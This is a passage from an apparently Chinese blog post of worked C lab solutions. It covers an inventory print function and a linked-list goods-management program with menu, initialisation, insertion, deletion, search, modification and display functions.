class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab51.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part Number   Part Name                  &quot;</span><br>         <span class="hljs-string">&quot;Quantity on Hand\n&quot;</span>);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; np; i++)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%7d       %-25s%11d\n&quot;</span>, inv[i].number,<br>           inv[i].name, inv[i].on_hand);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实验六"><a href="#实验六" class="headerlink" title="实验六"></a>实验六</h2><h3 id="链表：01-软件界面控制"><a href="#链表：01-软件界面控制" class="headerlink" title="链表：01-软件界面控制"></a>链表：01-软件界面控制</h3><blockquote><p>实现一个数字选项式的启动界面，程序输入数据为（1-8），参考界面如下：</p><blockquote><ol><li>显示所有商品的信息</li><li>修改某个商品的信息</li><li>插入某个商品的信息</li><li>删除某个商品的信息</li><li>查找某个商品的信息</li><li>商品存盘并退出系统</li><li>对商品价格进行排序</li><li>(慎用)删除所有内容</li></ol><p> 其他. 不存盘并退出系统</p></blockquote><p>程序当输入1-8时，执行相关功能，完成后再次显示菜单让用户选择。当输入其它数值时，程序不存盘并退出系统。</p><p>本小题只需实现 main 函数即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> GOODS_FILE_NAME <span class="hljs-string">&quot;goodsinfo.txt&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ID_LEN 30</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_NAME_LEN 30</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PRICE_LEN 30</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_DISCOUNT_LEN 30</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">char</span> goods_id[MAX_ID_LEN];<br><span class="hljs-type">char</span> goods_name[MAX_NAME_LEN];<br><span class="hljs-type">int</span> goods_price;<br><span class="hljs-type">char</span> goods_discount[MAX_DISCOUNT_LEN];<br><span class="hljs-type">int</span> goods_amount;<br><span class="hljs-type">int</span> goods_remain;<br>&#125; GoodsInfo;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>GoodsInfo data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; GoodsList;<br><br>GoodsInfo <span class="hljs-title function_">read_goods_info</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">init_list</span><span class="hljs-params">(GoodsList **pL)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list</span><span class="hljs-params">(GoodsList **pL)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list_and_file</span><span class="hljs-params">(GoodsList **pL)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">save_to_file</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">output_one_item</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">output_all_items</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">insert_item</span><span class="hljs-params">(GoodsList *L, GoodsInfo item, <span class="hljs-type">int</span> choice)</span>;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">delete_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span>* goods_id)</span>;<br>GoodsList* <span class="hljs-title function_">search_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span>* goods_id)</span>;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">change_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span>* goods_id, GoodsInfo new_info)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bubble_sort</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab52.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> code;<br>    GoodsList *GoodsList;<br>    init_list(&amp;GoodsList);<br>    <span class="hljs-type">char</span> id[MAX_ID_LEN];<br><br>    <span class="hljs-type">char</span> *<span class="hljs-built_in">list</span> = <span class="hljs-string">&quot;1.显示所有商品的信息\n2.修改某个商品的信息\n3.插入某个商品的信息\n4.删除某个商品的信息\n5.查找某个商品的信息\n6.商品存盘并退出系统\n7.对商品价格进行排序\n8.(慎用)删除所有内容\n其他.不存盘并退出系统&quot;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-built_in">list</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;code);<br>        <span class="hljs-keyword">switch</span> (code)<br>        &#123;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            output_all_items(GoodsList);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        &#123;<br>            read_line(id, MAX_ID_LEN);<br>            GoodsInfo newInfo = read_goods_info();<br>            change_item(GoodsList, id, newInfo);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        &#123;<br>            <span class="hljs-type">int</span> choice;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice);<br>            GoodsInfo newInfo = read_goods_info();<br>            insert_item(GoodsList, newInfo, choice);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        &#123;<br>            read_line(id, MAX_ID_LEN);<br>            delete_item(GoodsList, id);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        &#123;<br>            read_line(id, MAX_ID_LEN);<br>            search_item(GoodsList, id);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>            save_to_file(GoodsList);<br>            destory_list(&amp;GoodsList);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">// break;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>            bubble_sort(GoodsList);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            destory_list_and_file(&amp;GoodsList);<br>            <span class="hljs-comment">// return 0;</span><br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">default</span>:<br>            destory_list(&amp;GoodsList);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：02-初始化"><a href="#链表：02-初始化" class="headerlink" title="链表：02-初始化"></a>链表：02-初始化</h3><blockquote><p>函数原型：void init_list(GoodsList **L)</p><p>其中 *L 为指向链表头结点的指针，L为指向链表头结点指针的地址，init_list首先创建链表的头结点，之后读取goodsinfo.txt<a href="https://icoding.run/static/goodsinfo.txt">(示例文件下载)</a>中的商品信息，并初始化链表，函数执行后，需确保 *L 为指向链表头结点的指针。</p><p>init_list 实现商品信息链表的初始化，函数从已有的商品信息文件goodsinfo.txt<a href="https://icoding.run/static/goodsinfo.txt">(示例文件下载)</a>中读入商品信息，并且分配内存保存至链表中。<br>为了方便在表头插入和删除结点的操作，经常在表头结点（存储第一个元素的结点）的前面增加一个结点，称之为头结点或表头附加结点。这样原来的表头指针由指向第一个元素的结点改为指向头结点，头结点的数据域为空，头结点的指针域指向第一个元素的结点。</p><p>注：使用 fopen 函数打开文件时，文件名必须为 GOODS_FILE_NAME，否则检测不通过。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_list</span><span class="hljs-params">(GoodsList **pL)</span><br>&#123;<br>    *pL = (GoodsList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(GoodsList));<br>    (*pL)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    GoodsList *Cur = *pL;<br>    GoodsInfo info;<br><br>    FILE *f;<br>    f = fopen(GOODS_FILE_NAME, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!f)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open file for reading&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(f, <span class="hljs-string">&quot;%s\t%s\t%d\t%s\t%d\t%d\n&quot;</span>,<br>                  info.goods_id,<br>                  info.goods_name,<br>                  &amp;info.goods_price,<br>                  info.goods_discount,<br>                  &amp;info.goods_amount,<br>                  &amp;info.goods_remain) != EOF)<br>    &#123;<br>        GoodsList *L = (GoodsList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(GoodsList));<br>        L-&gt;data = info;<br>        L-&gt;next = Cur-&gt;next;<br>        Cur-&gt;next = L;<br>        Cur = Cur-&gt;next;<br>        CurrentCnt++;<br>    &#125;<br>    fclose(f);<br>    f = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：03-插入"><a href="#链表：03-插入" class="headerlink" title="链表：03-插入"></a>链表：03-插入</h3><blockquote><p>函数原型：bool insert_item(GoodsList *L, GoodsInfo goodsInfo, int choice)，</p><p>L为指向链表头结点的指针，函数根据choise的值，将goodsInfo插入到链表的指定位置，如果成功插入，函数返回true，如果未插入，函数返回false。</p><p>分别实现头插法、尾插法，中间位置插入三种:</p><ul><li>用户输入0，将商品信息插入到链表尾部；</li><li>用户输入1，将商品信息插入到链表头部；</li><li>用户输入其它正整数i，将商品信息插入到链表中间第i号位置, 例如：输入3，应该在第二个节点后插入新节点</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">insert_item</span><span class="hljs-params">(GoodsList *L, GoodsInfo item, <span class="hljs-type">int</span> choice)</span><br>&#123;<br>    GoodsList *pL = (GoodsList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(GoodsList));<br>    pL-&gt;data = item;<br><br>    GoodsList *Cur = L;<br><br>    <span class="hljs-keyword">switch</span> (choice)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>    &#123;<br>        <span class="hljs-keyword">while</span> (Cur-&gt;next)<br>            Cur = Cur-&gt;next;<br>        pL-&gt;next = <span class="hljs-literal">NULL</span>;<br>        Cur-&gt;next = pL;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        pL-&gt;next = L-&gt;next;<br>        L-&gt;next = pL;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>    &#123;<br>        <span class="hljs-type">int</span> k = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k++ != choice)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (!Cur-&gt;next || choice &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>            Cur = Cur-&gt;next;<br>        &#125;<br><br>        pL-&gt;next = Cur-&gt;next;<br>        Cur-&gt;next = pL;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    &#125;<br>    CurrentCnt++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：04-删除节点"><a href="#链表：04-删除节点" class="headerlink" title="链表：04-删除节点"></a>链表：04-删除节点</h3><blockquote><p>函数原型：bool delete_item(GoodsList <em>L, char</em> goods_id)</p><p>其中L为指向链表头结点的指针，goods_id为要删除商品的ID；</p><p>如果成功删除，函数返回true，否则返回false。</p><p>delete_item 根据商品的ID来删除对应的商品信息，商品查找通过字符串比较的方式，查找到后释放对应指针指向的内存区域，完成删除。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">delete_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span> *goods_id)</span><br>&#123;<br>    GoodsList *Cur = L, *Del = Cur-&gt;next;<br>    <span class="hljs-keyword">while</span> (Del)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(Del-&gt;data.goods_id, goods_id))<br>        &#123;<br>            Cur-&gt;next = Del-&gt;next;<br>            <span class="hljs-built_in">free</span>(Del);<br>            CurrentCnt--;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        Del = Del-&gt;next;<br>        Cur = Cur-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：05-查找"><a href="#链表：05-查找" class="headerlink" title="链表：05-查找"></a>链表：05-查找</h3><blockquote><p>函数原型：GoodsList* search_item(GoodsList <em>L, char</em> goods_id)</p><p>其中L为指向链表头结点的指针，goods_id为要查找商品的ID；</p><p>如果找到该商品，函数返回该商品对应的结点指针，否则返回 NULL.</p><p>根据输入的商品 ID 来查找对应的商品信息，商品 ID 的判断用字符串比较的方式来实现，然后调用格式化显示查找到的商品信息.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br>GoodsList *<span class="hljs-title function_">search_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span> *goods_id)</span><br>&#123;<br>    GoodsList *Cur = L;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(Cur-&gt;data.goods_id, goods_id))<br>        &#123;<br>            <span class="hljs-keyword">return</span> Cur;<br>        &#125;<br>        Cur = Cur-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：06-修改"><a href="#链表：06-修改" class="headerlink" title="链表：06-修改"></a>链表：06-修改</h3><blockquote><p>函数原型：bool change_item(GoodsList <em>L, char</em> goods_id, GoodsInfo new_info)</p><p>其中 L 为指向链表头结点的指针，goods_id 为要修改的商品 ID，new_info 为该商品的最新数据。函数成功修改后返回true，否则返回 false。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">change_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span> *goods_id, GoodsInfo new_info)</span><br>&#123;<br>    GoodsList *Cur = L;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(Cur-&gt;data.goods_id, goods_id))<br>        &#123;<br>            Cur-&gt;data = new_info;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        Cur = Cur-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：07-显示单个节点"><a href="#链表：07-显示单个节点" class="headerlink" title="链表：07-显示单个节点"></a>链表：07-显示单个节点</h3><blockquote><p>函数原型：void output_one_item(GoodsList *p)，函数显示结点为 p 的商品信息。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">output_one_item</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, L-&gt;data.goods_id);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, L-&gt;data.goods_name);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, L-&gt;data.goods_price);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, L-&gt;data.goods_discount);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, L-&gt;data.goods_amount);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, L-&gt;data.goods_remain);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：08-显示所有节点"><a href="#链表：08-显示所有节点" class="headerlink" title="链表：08-显示所有节点"></a>链表：08-显示所有节点</h3><blockquote><p>函数原型：void output_all_items(GoodsList *L)，</p><p>L为指针链表头结点的指针，output_all_items 调用 output_one_item 函数，将链表中所有的商品信息以格式化的方式打印输出到屏幕上。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 